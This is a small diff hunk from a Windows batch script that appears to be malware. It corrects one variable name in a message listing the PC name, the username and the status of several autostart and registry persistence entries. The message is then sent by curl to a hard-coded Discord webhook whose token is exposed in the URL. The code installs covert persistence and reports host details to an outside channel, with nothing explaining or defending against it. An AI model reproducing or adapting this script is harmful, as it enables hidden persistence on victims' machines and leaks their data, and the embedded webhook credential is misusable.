@@ -106,7 +106,7 @@ set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
 set time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%
 
 
-set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\n  ProgramDataRegistry-Autostart: %pcregistryauto%\n  ProgramDataRegistry-File: %pcregistryfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%\n  UserRegistry-Autostart: %userregistryautostart%\n  UserRegistry-File: %userregistryfile%\nTIME: %time%
+set content=---------------------------\nPC: %ComputerName%\n  ProgramData-Autostart: %pcauto%\n  ProgramData-File: %pcfile%\n  ProgramDataRegistry-Autostart: %pcregistryauto%\n  ProgramDataRegistry-File: %pcregistryfile%\nUSER: %USERNAME%\n  User-Autostart: %userauto%\n  User-File: %userfile%\n  UserRegistry-Autostart: %userregistryauto%\n  UserRegistry-File: %userregistryfile%\nTIME: %time%
 curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"%content%\"}" https://discord.com/api/webhooks/1084452705105354762/4m7y_EJmQvhR6NZUIpJrJ0-ppH9q_JzOIJhEQ2EQ-6HDIFHkqYISeHyy_IHDZ4ZT1aDh
 
 
